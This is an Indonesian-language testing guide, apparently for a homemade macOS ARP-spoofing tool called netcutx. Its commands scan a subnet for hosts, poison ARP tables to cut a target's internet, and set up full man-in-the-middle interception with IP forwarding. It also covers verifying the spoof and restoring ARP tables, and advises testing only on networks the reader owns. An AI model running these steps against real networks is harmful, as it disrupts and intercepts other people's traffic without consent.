# Panduan Testing netcutx

## Persiapan

### 1. Cek IP & Gateway jaringan kamu

```bash
# Cek alamat IP dan gateway
ifconfig en0 | grep "inet "
route -n get default | grep gateway

# Cek interface yang aktif (biasanya en0 untuk WiFi)
ifconfig en0 | grep status
```

### 2. Cari target (device lain di jaringan yang sama)

```bash
# Scan semua device lokal (gunakan IP subnet kamu)
# Misal subnet 192.168.1.x:
for i in {1..254}; do ping -c1 -W1 192.168.101.$i &>/dev/null && echo "192.168.101.$i UP"; done

# Atau cek ARP table (device yang sudah dikenal)
arp -a
```

### 3. Pastikan sudah build

```bash
make clean && make
```

---

## Mode Testing

### Level 1: Dry Run (tanpa sudo)

Cek apakah deteksi interface/gateway jalan dengan benar:

```bash
build/netcutx --help

# Test deteksi otomatis
build/netcutx -v 192.168.101.50
```

Output yang diharapkan:
```
Gateway: 192.168.101.1
Our IP: 192.168.101.71
Our MAC: xx:xx:xx:xx:xx:xx
Victim: 192.168.101.50
Error opening BPF: BPF open failed: open /dev/bpf*: Permission denied
Try running with sudo
```

Kalau data di atas benar (IP, MAC, gateway sesuai), lanjut ke Level 2.

### Level 2: Single Shot (verifikasi ARP spoof bisa dikirim)

Untuk satu kali kirim tanpa loop (kita tidak punya fitur `--once`, jadi jalankan dan Ctrl+C cepat):

```bash
# Pilih target yang tidak krusial (misal IP kosong/padam)
sudo build/netcutx -i en0 -g 192.168.101.1 -r 10 192.168.101.50
```

Tekan Ctrl+C dalam 1-2 detik setelah melihat "Spoof #1".

Cek apakah serangan berhasil:

```bash
# Dari komputer lain, cek ARP table
arp -a | grep 192.168.101.1
# Kalau MAC gateway berubah jadi MAC kamu -> spoof berhasil!
```

Atau:

```bash
# Dari komputer kamu sendiri, lihat apakah paket ARP terkirim
sudo tcpdump -i en0 arp -c 10
```

### Level 3: Full Test (device nyata)

**⚠️ PERINGATAN:** Ini akan MEMOTONG akses internet device target.

```bash
# Pilih device target yang kamu punya akses fisik
sudo build/netcutx 192.168.101.50
```

Pada device target:
- Coba buka website apa saja
- **Seharusnya:** halaman tidak bisa dimuat (koneksi terputus)
- **Catatan:** kalau device target menggunakan VPN/HTTPS, koneksi mungkin tetap jalan tapi lambat

### Level 4: Bidirectional + Forward (MITM penuh)

Untuk mencegat lalu lintas (bukan sekedar motong koneksi):

```bash
sudo build/netcutx -b -f 192.168.101.50
```

Dengan `-f` (IP forwarding), lalu lintas target akan melewati komputer kamu.
Dengan `-b` (bidirectional), kamu juga menipu gateway.

---

## Yang Perlu Diperhatikan

### ARP Spoof Tidak Bekerja (macOS 15.4+)

Kalau kamu di macOS 15.4+ (Sequoia), ada kemungkinan ARP spoof **tidak bekerja** di WiFi karena Apple menambahkan proteksi. Tandanya:
- Paket ARP terkirim (tcpdump melihatnya)
- Tapi ARP table device target tidak berubah
- Koneksi target tetap jalan normal

Solusi: belum ada untuk pure macOS. Project ini masih eksperimental.

### Keamanan

- Hanya test di jaringan yang kamu miliki
- Jangan test di jaringan kantor/kampus tanpa izin
- Gunakan IP forwarding hanya untuk riset

### Restore

Program akan mengirim ARP restore otomatis saat Ctrl+C ditekan.
Kalau program crash, jalankan manual:

```bash
# Cari tau MAC asli gateway dari device lain
# Lalu restore manual via ARP
sudo arp -s 192.168.101.1 xx:xx:xx:xx:xx:xx
```

---

## Skenario Test Lengkap

```bash
# 1. Build
make clean && make

# 2. Test deteksi (tanpa root)
build/netcutx -v 192.168.101.50

# 3. Cek ARP target masih normal (dari komputer lain)
arp -a | grep 192.168.101.50

# 4. Jalankan serangan (2 detik lalu Ctrl+C)
sudo build/netcutx -r 1 192.168.101.50
# ^C setelah 2 detik

# 5. Verifikasi ARP sudah direstore
arp -a | grep 192.168.101.1
# MAC gateway harus kembali normal (bukan MAC kamu)
```
